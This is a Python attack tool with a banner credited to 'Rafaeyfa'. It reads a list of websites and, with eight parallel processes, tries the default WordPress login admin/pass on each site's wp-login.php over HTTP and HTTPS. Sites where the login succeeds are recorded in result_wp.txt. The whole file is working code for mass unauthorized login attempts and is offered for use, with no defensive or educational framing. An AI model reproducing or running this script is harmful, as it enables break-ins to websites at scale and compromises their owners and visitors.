import requests, sys, os, multiprocessing, colorama, platform
from colorama import Fore, Style
from platform import system
if system() == 'Linux':
    os.system('clear')
else:
    os.system('cls')
print(f"""{Fore.YELLOW}
    __  ___                _       ______  ____       ____
   /  |/  /__  ____ _____ | |     / / __ \/ __ \___  / __/
  / /|_/ / _ \/ __ `/ __ `/ | /| / / /_/ / / / / _ \/ /_  
 / /  / /  __/ /_/ / /_/ /| |/ |/ / ____/ /_/ /  __/ __/  
/_/  /_/\___/\__, /\__,_/ |__/|__/_/   /_____/\___/_/ {Fore.YELLOW}
            /____/  {Fore.WHITE}(c) Rafaeyfa | WordPress Default Username/Password (username:admin | password: pass)\n""")
listmega = input("Website list: ")
def brute_force(url):
    try:
        r = requests.post('http://' + url + '/wp-login.php', data={'log': 'admin', 'pwd': 'pass'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10)
        if '#wpadminbar' in r.text:
            print(f'{Fore.WHITE}[{Fore.YELLOW}MEGA{Fore.WHITE}] http://' + url + f'/wp-login.php |{Fore.GREEN} OK')
            with open('result_wp.txt', 'a') as output:
                output.write('Login successful: ' + 'http://' + url + '/wp-login.php\n')
        else:
            print(f'{Fore.WHITE}[{Fore.YELLOW}MEGA{Fore.WHITE}] http://' + url + f'/wp-login.php |{Fore.RED} NO')
    except:
        pass
    try:
        r = requests.post('https://' + url + '/wp-login.php', data={'log': 'admin', 'pwd': 'pass'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10)
        if '#wpadminbar' in r.text:
            print(f'{Fore.WHITE}[{Fore.YELLOW}MEGA{Fore.WHITE}] https://' + url + f'/wp-login.php |{Fore.GREEN} OK')
            with open('result_wp.txt', 'a') as output:
                output.write('Login successful: ' + 'https://' + url + '/wp-login.php\n')
        else:
            print(f'{Fore.WHITE}[{Fore.YELLOW}MEGA{Fore.WHITE}] https://' + url + f'/wp-login.php |{Fore.RED} NO')
    except:
        pass

def main():
    with open(listmega, 'r') as f:
        urls = [line.strip('\n') for line in f.readlines()]
        pool = multiprocessing.Pool(processes=8)
        pool.map(brute_force, urls)
if __name__ == '__main__':
    main()
